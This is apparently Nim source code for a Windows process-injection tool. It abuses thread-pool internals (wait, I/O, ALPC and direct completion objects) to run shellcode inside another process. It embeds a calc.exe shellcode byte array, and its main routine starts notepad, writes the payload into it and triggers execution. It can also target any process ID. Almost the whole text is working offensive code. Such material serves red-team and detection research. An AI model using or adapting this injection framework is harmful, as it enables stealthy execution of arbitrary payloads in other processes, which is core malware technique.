  if WriteProcessMemory(tProcess, remoteTpDirect, (pTpWait.Direct).addr, sizeof(TP_DIRECT), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Create event object
  let msg = newWideCString("m4ul3r event object".cstring)
  hEvent = CreateEventW(NULL, FALSE, FALSE, cast[LPCWSTR](msg[0].addr))
  if hEvent == 0:
    WIN32_ERR("CreateEventW")
    return false

  status = pNtAssociateWaitCompletionPacket(
    cast[HANDLE](pTpWait.WaitPkt), # This wait packet is associated with the shellcode
    hIoPort,                       # Where to send this packet once event is signaled
    hEvent,                        # The event in question
    remoteTpDirect,                # The helper object or key that gets looked at when a signal occurs
    remoteTpWait,                  # The actual callback
    0, 0, NULL
  )
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAssociateWaitCompletionPacket", status)
    return false

  SetEvent(hEvent)

  return true


proc injectViaTpIo*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    fullFilePath, tempPath: array[MAX_PATH, WCHAR]
    hFile: HANDLE
    pTpIo: PFULL_TP_IO
    pRemoteTpIo: PVOID
    ioStatusBlock: IO_STATUS_BLOCK
    fileCompletionInfo: FILE_COMPLETION_INFO
    status: NTSTATUS
    overlapped: OVERLAPPED

  let pNtSetInformationFile = cast[NtSetInformationFile](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtSetInformationFile"))
  if pNtSetInformationFile == nil:
    echo "[!] Failed to get NtSetInformation funciton pointer"
    return false

  # Get a random file we can use
  if GetTempPathW(MAX_PATH, cast[LPWSTR](tempPath[0].addr)) == 0:
    WIN32_ERR("GetTempPathW")
    return false

  let prefix = newWideCString("m4".cstring)
  if GetTempFileNameW(cast[LPCWSTR](tempPath[0].addr), cast[LPCWSTR](prefix[0].addr), 0, fullFilePath[0].addr) == 0:
    WIN32_ERR("GetTempFileNameW")
    return false

  hFile = CreateFileW(
    cast[LPCWSTR](fullFilePath[0].addr), GENERIC_READ or GENERIC_WRITE, 
    FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 
    FILE_ATTRIBUTE_NORMAL or FILE_FLAG_OVERLAPPED, 0                    # FILE_FLAG_OVERLAPPED is crucial for the signal to work
  )
  if hFile == INVALID_HANDLE_VALUE:
    WIN32_ERR("CreateFileW")
    return false

  # Create TP_IO object for callback
  pTpIo = cast[PFULL_TP_IO](CreateThreadpoolIo(
    hFile, cast[PTP_WIN32_IO_CALLBACK](pAddress), NULL, NULL
  ))
  if pTpIo == nil:
    WIN32_ERR("CreateThreadPoolIo")
    return false

  pTpIo.CleanupGroupMember.Union_1.Callback = pAddress
  pTpIo.PendingIrpCount += 1

  # Allocate TP_IO memory and write
  pRemoteTpIo = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_IO), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if pRemoteTpIo == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Associate the file with the target process' IO completion port.
  # Any interaction with the file will now send a packet to the completion port, triggering the callback.
  fileCompletionInfo.Key = (cast[PFULL_TP_IO](pRemoteTpIo).Direct).addr
  fileCompletionInfo.Port = hIoPort

  status = pNtSetInformationFile(
    hFile, ioStatusBlock.addr, cast[PVOID](fileCompletionInfo.addr), 
    sizeof(FILE_COMPLETION_INFO).ULONG, cast[FILE_INFORMATION_CLASS](61)
    )
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtSetInformationFile", status)
    return false

  # Trigger the callback via file interaction
  let msg = "m4ul3r".cstring
  if WriteFile(hFile, cast[LPCVOID](msg[0].addr), msg.len.DWORD, NULL, overlapped.addr) == 0 and GetLastError() != ERROR_IO_PENDING:
    WIN32_ERR("WriteFile")
    return false

  return true

proc injectViaAlpc*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    status: NTSTATUS
    hTempApcPort, hRealApcPort: HANDLE
    remoteTpAlpc: PVOID
    alpcMessageString: string = "m4ul3r"
    usAlpcPortName: UNICODE_STRING
    pFullTpAlpc: PFULL_TP_ALPC
    objectAttributes, clientAlpcAttributes: OBJECT_ATTRIBUTES
    alpcPortAttributes: ALPC_PORT_ATTRIBUTES

  let
    pNtAlpcCreatePort = cast[NtAlpcCreatePort](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAlpcCreatePort"))
    pTpAllocAlpcCompletion = cast[TpAllocAlpcCompletion](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "TpAllocAlpcCompletion"))
    pNtAlpcSetInformation = cast[NtAlpcSetInformation](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAlpcSetInformation"))
    pNtAlpcConnectPort = cast[NtAlpcConnectPort](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAlpcConnectPort"))
  
  if pNtAlpcCreatePort == nil or pTpAllocAlpcCompletion == nil or pNtAlpcSetInformation == nil or pNtAlpcConnectPort == nil:
    echo "[!] Failed to get ALPC-related function pointers"
    return false

  # Create ALPC object
  status = pNtAlpcCreatePort(hTempApcPort.addr, NULL, NULL)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAlpcCreatePort", status)
    return false

  # Create ALPC callback structure
  status = pTpAllocAlpcCompletion(pFullTpAlpc.addr, hTempApcPort, cast[PVOID](pAddress), NULL, NULL)
  if not NT_SUCCESS(status):
    NTAPI_ERR("TpAllocAlpcCompletion", status)
    return false

  # Create second port
  let portName = newWideCString("\\RPC Control\\m4ul3rsApcPort".cstring)
  RtlInitUnicodeString(usAlpcPortName.addr, cast[PCWSTR](portName[0].addr))

  objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
  objectAttributes.ObjectName = usAlpcPortName.addr

  alpcPortAttributes.Flags = 0x20000
  alpcPortAttributes.MaxMessageLength = 328

  status = pNtAlpcCreatePort(hRealApcPort.addr, objectAttributes.addr, alpcPortAttributes.addr)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAplcCreatePort", status)
    return false

  # Copy ALPC callback struct into target process
  remoteTpAlpc = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpAlpc == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, remoteTpAlpc, pFullTpAlpc, sizeof(FULL_TP_ALPC), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Associate the process' IO completion port with our ALPC object
  var alpcAssocCompletionPort: ALPC_PORT_ASSOCIATE_COMPLETION_PORT
  alpcAssocCompletionPort.CompletionKey = remoteTpAlpc
  alpcAssocCompletionPort.CompletionPort = hIoPort

  status = pNtAlpcSetInformation(hRealApcPort, 2.ULONG, cast[PVOID](alpcAssocCompletionPort.addr), sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT).ULONG)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAlpcSetInformation", status)

  # Send a message to the ALPC object
  clientAlpcAttributes.Length = sizeof(OBJECT_ATTRIBUTES).ULONG

  var clientAlpcMessage: ALPC_MESSAGE
  clientAlpcMessage.PortHeader.Union_1.S1.DataLength = alpcMessageString.len().USHORT
  clientAlpcMessage.PortHeader.Union_1.S1.TotalLength = (sizeof(PORT_MESSAGE) + alpcMessageString.len()).USHORT
  copyMem(clientAlpcMessage.PortMessage[0].addr, alpcMessageString[0].addr, alpcMessageString.len())
  let clientAlpcMessageSize = sizeof(clientAlpcMessage)

  # If a timeout for the ALPC connection is not specified, it will infinitely block
  var timeout: LARGE_INTEGER
  timeout.QuadPart = -10000000

  # Initiate the ALPC port connection and send IO packet
  var outHandle: HANDLE
  status = pNtAlpcConnectPort(
    outHandle.addr, usAlpcPortName.addr, clientAlpcAttributes.addr, alpcPortAttributes.addr, 
    0x20000.DWORD, NULL, cast[PPORT_MESSAGE](clientAlpcMessage.addr), cast[PSIZE_T](clientAlpcMessageSize.addr),
    NULL, NULL, timeout.addr
  )
  if status != ERROR_SUCCESS and status != STATUS_TIMEOUT:
    NTAPI_ERR("NtAlpcConnectPort", status)
    return false

  return true
  
proc injectViaTpDirect*(tProcess: HANDLE, pAddress: pointer, hIoPort: HANDLE): bool =
  var
    direct: TP_DIRECT
    remoteTpDirect: PVOID
    status: NTSTATUS
  
  direct.Callback = pAddress

  # Allocate remote memory for the TP_DIRECT object
  remoteTpDirect = VirtualAllocEx(tProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpDirect == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, remoteTpDirect, direct.addr, sizeof(TP_DIRECT), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  let pNtSetIoCompletion = cast[NtSetIoCompletion](
    GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtSetIoCompletion")
  )
  if pNtSetIoCompletion == nil:
    echo "[!] Failed to get NtSetIoCompletion function pointer"
    return false

  # Trigger malicious callback
  status = pNtSetIoCompletion(hIoPort, remoteTpDirect, cast[PVOID](0), 0, 0)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtSetIoCompletion", status)
    return false
  
  return true


#[ Shellcode ]#
# Nimless nim WinExec("calc.exe") shellcode
var buf: array[279, byte] = [
  byte 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xC7, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
  0x90, 0x57, 0x48, 0x89, 0xCA, 0x56, 0x53, 0x48, 0x81, 0xEC, 0xE0, 0x01, 0x00, 0x00, 0x48,
  0x63, 0x41, 0x3C, 0x48, 0x8D, 0xBC, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x74, 0x01, 
  0x18, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x89, 0xE7, 0x48, 0x8D, 0xB4, 0x24, 
  0xF0, 0x00, 0x00, 0x00, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x63, 0x44, 0x24,
  0x70, 0x48, 0x01, 0xD0, 0x4C, 0x63, 0x40, 0x20, 0x44, 0x8B, 0x58, 0x1C, 0x8B, 0x58, 0x24, 
  0x8B, 0x70, 0x14, 0x31, 0xC0, 0x49, 0x01, 0xD0, 0x39, 0xC6, 0x7E, 0x52, 0x4D, 0x63, 0x08, 
  0xB9, 0xFF, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD1, 0x45, 0x0F, 0xB6, 0x11, 0x49, 0xFF, 0xC1,
  0x45, 0x84, 0xD2, 0x75, 0x15, 0x4C, 0x8D, 0x48, 0x01, 0x49, 0x83, 0xC0, 0x04, 0x81, 0xF9,
  0x32, 0xC5, 0x79, 0x7B, 0x74, 0x0D, 0x4C, 0x89, 0xC8, 0xEB, 0xD0, 0x6B, 0xC9, 0x21, 0x44, 
  0x01, 0xD1, 0xEB, 0xD7, 0x48, 0x01, 0xC0, 0x4C, 0x63, 0xC3, 0x49, 0x63, 0xCB, 0x48, 0x01, 
  0xD0, 0x42, 0x0F, 0xB7, 0x04, 0x00, 0x48, 0x8D, 0x04, 0x82, 0x48, 0x63, 0x04, 0x08, 0x48,
  0x01, 0xD0, 0xEB, 0x02, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0xE0, 0x01, 0x00, 0x00, 0x5B, 0x5E, 
  0x5F, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x83, 
  0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 
  0xC6, 0x44, 0x24, 0x2F, 0x00, 0x48, 0x89, 0x44, 0x24, 0x27, 0x65, 0x48, 0x8B, 0x04, 0x25, 
  0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 
  0x96, 0x48, 0xAD, 0x48, 0x8B, 0x48, 0x20, 0xE8, 0x05, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x4C, 
  0x24, 0x27, 0x31, 0xD2, 0xFF, 0xD0, 0x90, 0xEB, 0xFD
]

let 
  pBuf = buf[0].addr
  bufLen = buf.len

proc initTarget(): HANDLE =
  # Start notepad Process
  let tProcess = startProcess("notepad.exe")
  # Get handle to notepat
  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, tProcess.processID.DWORD)
  echo &"[&] Starting notepad.exe for testing..."
  echo &" \\__> PID: {tProcess.processID}"
  echo &" \\__> HANDLE: {pHandle}"
  return pHandle

proc openHandleToProcess(pid: int): HANDLE =
  var hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid.DWORD)
  if hProcess != 0:
    return hProcess
  else:
    echo "[!] Failed to open process to PID: ", pid
    return -1

proc handleThreadPoolInjection(pid: int, typ, subtyp: string): bool =
  var 
    pHandle: HANDLE
    hijackHandle1, hijackHandle2: HANDLE
    rPayload: PVOID


  if pid != -1:
    pHandle = openHandleToProcess(pid)
    echo "[+] openHandleToProcess Successful ", repr(pHandle)
    if pHandle == -1:
      echo "[!] openHandleToProcess Failed"
      return false
  else:
    pHandle = initTarget()
    echo "[+] initTarget Successful ", repr(pHandle)
  if not writePayloadIntoProcess(pHandle, pBuf, bufLen, rPayload.addr):
    echo "[!] writePayloadIntoProcess Failed "
    return false
  else:
    echo "[+] writePayloadIntoProcess Successful ", repr(rPayload)

  # sleep to improve stability
  sleep(100)


  hijackHandle1 = hijackProcessIoPort(pHandle)
  echo "[+] hijackProcessIoPort Successful ", repr(hijackHandle1)
  
  return injectViaTpDirect(pHandle, rPayload, hijackHandle1)

  return true

#[ Main ]#
proc main() =
  var 
    pid: int
    t, s: string

    
  pid = -1
  
  if handleThreadPoolInjection(pid, t, s):
    echo "[+] Pool Injection Successful"
    quit()
  else:
    echo "[!] Pool Injection Failed"
    quit(1)
  

when isMainModule:
  main()
